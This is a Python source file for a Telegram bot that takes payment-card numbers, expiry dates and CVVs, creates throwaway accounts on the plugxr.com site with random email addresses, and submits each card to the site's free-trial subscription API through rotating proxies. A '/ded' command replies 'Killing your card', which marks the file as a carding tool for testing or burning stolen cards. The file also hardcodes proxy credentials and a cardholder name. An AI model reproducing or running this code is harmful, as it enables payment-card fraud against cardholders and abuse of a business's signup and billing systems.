import requests
import random
import string
from telethon import TelegramClient, events

DOMAINS = ('gmail.com', 'yahoo.com', 'outlook.com')
BASE_HEADERS = {
    'accept': '*/*',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.plugxr.com',
    'referer': 'https://www.plugxr.com/',
    'user-agent': 'Mozilla/5.0'
}
SIGNUP_URL = 'https://creatorapi.plugxr.com/api/auth/signUp'
SUBSCRIBE_URL = 'https://creatorapi.plugxr.com/api/Pricing/FreeTrailSubscription'
SIGNUP_DATA = {
    'terms_conditions': 'true',
    'password': 'vfvxvxddzsvNysy61?'
}
SUBSCRIPTION_BASE = {
    'plan_code': 'PXR-INDIVIDUAL-PLAN-ONE-SOUTH-ASIA',
    'subscription_type': 'subscription_trail',
    'billing_period': 'yearly',
    'billing_first_name': 'null',
    'billing_last_name': 'null',
    'billing_organisation': 'null',
    'billing_landmark': 'New York',
    'billing_city': 'New York',
    'billing_state': 'New York',
    'billing_pin': '10040',
    'billing_country': 'United States',
    'billing_phone': 'null',
    'card_name': 'Mohammed Nehal',
    'payment_method': 'card'
}
PROXIES = {
    "http": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/",
    "https": "http://tnapkbnn-rotate:8vsviipgym5g@p.webshare.io:80/"
}

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@{random.choice(DOMAINS)}"

def process_card(card_input: str):
    """Process single CC and return full subscription response text."""
    try:
        cc, mm, yy, cvv = card_input.strip().split("|")
        yy = yy[-2:] if len(yy) == 4 else yy

        with requests.Session() as session:
            # Signup
            signup_data = SIGNUP_DATA.copy()
            signup_data['email'] = generate_random_email()
            signup_resp = session.post(SIGNUP_URL, headers=BASE_HEADERS, data=signup_data, proxies=PROXIES)
            signup_json = signup_resp.json()
            token = signup_json.get("access_token")
            if not token:
                return False, f"Signup failed: {signup_json}"

            # Subscribe
            headers = BASE_HEADERS.copy()
            headers['authorization'] = f'Bearer {token}'
            data = SUBSCRIPTION_BASE.copy()
            data.update({'card_number': cc, 'card_month': mm, 'card_year': yy, 'card_cvv': cvv})
            subscribe_resp = session.post(SUBSCRIBE_URL, headers=headers, data=data, proxies=PROXIES)

            return True, subscribe_resp.text

    except Exception as e:
        return False, f"Error: {str(e)}"

# Function for DED event
async def process_card_au(client, event, card_info):
    """Handles the /ded command and processes the card."""
    processing = await event.reply("⚡ Killing your card... Please wait")
    success, result = process_card(card_info)

    if success:
        await processing.edit(f"✅ **Result:**\n\n```{result}```")
    else:
        await processing.edit(f"❌ **Failed:**\n\n{result}")


